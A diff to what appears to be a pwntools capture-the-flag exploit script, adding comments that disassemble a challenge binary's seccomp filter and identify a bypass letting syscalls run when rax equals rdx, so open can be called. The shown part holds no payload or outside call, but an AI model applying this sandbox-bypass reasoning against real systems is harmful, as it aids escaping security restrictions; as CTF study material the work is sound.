@@ -22,6 +22,42 @@ else:
     io = process('./artifact', env=env)
     elf, libc = io.elf, io.libc
 
+# the binary allows reading and writing to arbitrary locations
+
+# the tricky part was finding how to bypass the seccomp rules
+# enforced with prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...), since
+# the "official" tool to disassemble BPF bytecode provided by libseccomp doesn't handle
+# the BPF_X opcode correctly (and shows wrong rules)
+
+# luckily, https://github.com/niklasb/dump-seccomp seems to extract the correct rules:
+# prctl(PR_SET_NO_NEW_PRIVS)
+# prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)
+#   fprog @ 00007fffffffdd70
+#   20 blocks @ 00007fffffffdd80
+#   Disassembly:
+#      l0:	ld [4]
+#      l1:	jeq #0xc000003e, l2, l18
+#      l2:	ld [32]
+#      l3:	tax
+#      l4:	ld [0]
+#      l5:	jeq #0, l19, l6
+#      l6:	jeq #0x1, l19, l7
+#      l7:	jeq #0x5, l19, l8
+#      l8:	jeq #0x8, l19, l9
+#      l9:	jeq #0x9, l11, l10
+#      l10:	jeq #0xa, l11, l14
+#      l11:	txa
+#      l12:	and #0x1
+#      l13:	jeq #0x1, l18, l19
+#      l14:	jeq x, l19, l15
+#      l15:	jeq #0xc, l19, l16
+#      l16:	jeq #0x3c, l19, l17
+#      l17:	jeq #0xe7, l19, l18
+#      l18:	ret #0
+#      l19:	ret #0x7fff0000
+# at l14, syscalls in which rax == rdx are allowed to run: this means
+# we can execute open(..., ..., 2)
+
 # find the address of libc
 io.recvuntil('Choice?\n')
 io.sendline('1')
